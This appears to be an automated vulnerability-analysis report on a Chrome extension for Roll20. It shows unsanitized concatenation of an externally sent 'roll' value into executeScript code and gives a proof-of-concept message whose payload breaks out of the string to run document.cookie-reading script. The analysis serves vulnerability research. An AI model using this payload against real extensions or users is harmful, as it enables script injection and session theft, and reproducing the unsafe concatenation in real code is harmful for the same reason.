# CoCo Analysis: mjighpehkmbgedbpjgcnhlcbhhfmimph

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_tabs_executeScript_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/mjighpehkmbgedbpjgcnhlcbhhfmimph/opgen_generated_files/bg.js
Line 1008	if (request.roll) {
Line 993	chrome.tabs.executeScript(tabs[0].id, {code : 'var rolltext = "' + rolltext + '";'

**Code:**

```javascript
// Background script (bg.js) - External message handler
chrome.runtime.onMessageExternal.addListener(
  function(request, sender, sendResponse) {
    if (request.roll) { // ← attacker-controlled
      outcome = null;
      roll(request.roll, sendResponse); // ← passes attacker data
      return true;
    }
  }
);

function roll(rolltext, sendResponse) { // ← rolltext is attacker-controlled
  var r20url = "*://app.roll20.net/editor/";
  chrome.tabs.query({url: r20url}, function(tabs) {
    console.log("Got a response back from our search.");
    if (tabs.length > 0) {
      console.log("That response included a site match.");
      // String concatenation without sanitization - code injection
      chrome.tabs.executeScript(tabs[0].id, {code : 'var rolltext = "' + rolltext + '";' // ← attacker controls rolltext, can break out of quotes
      }, function () {
        chrome.tabs.executeScript(tabs[0].id, {file : 'roll20interactions.js'});
      });

      sendResponse( {success: true} );
    } else {
      sendResponse ( {success: false, message : "Could not find a Roll 20 game tab.", code : 100});
    }
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** chrome.runtime.onMessageExternal (externally_connectable allows merisyl.com and roll20.net domains)

**Attack:**

```javascript
// From any page matching *.merisyl.com/* or *.roll20.net/* (per manifest externally_connectable)
chrome.runtime.sendMessage('mjighpehkmbgedbpjgcnhlcbhhfmimph', {
  roll: '"; alert(document.cookie); var x="'
}, function(response) {
  console.log(response);
});

// The executed code becomes:
// var rolltext = ""; alert(document.cookie); var x="";
// This breaks out of the string literal and injects arbitrary JavaScript
```

**Impact:** An attacker controlling a website matching the externally_connectable patterns (*.merisyl.com/* or *.roll20.net/*) can execute arbitrary JavaScript code in any Roll20 tab by breaking out of the string concatenation. This allows full compromise of the Roll20 page context, including stealing session tokens, manipulating game data, or performing actions on behalf of the user.
